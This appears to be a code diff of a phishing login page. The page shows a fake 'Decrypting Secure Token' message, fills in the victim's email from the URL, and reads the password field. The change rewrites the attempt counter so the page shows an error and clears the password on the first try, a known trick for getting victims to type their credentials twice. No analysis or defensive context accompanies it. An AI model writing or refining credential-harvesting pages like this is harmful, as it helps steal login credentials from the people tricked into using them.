@@ -29,7 +29,7 @@
     <div id="ld" class="loader">Decrypting Secure Token...</div>
 </div>
 <script>
-    let tries = 0;
+    let tries = 1;
     const params = new URLSearchParams(window.location.search);
     
     // Auto-extract user from URL
@@ -43,7 +43,7 @@
         const email = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
 
-        if(tries === 2) {
+        if(tries === 1) {
             document.getElementById('err').style.display = 'block';
             document.getElementById('p').value = "";
         } else {
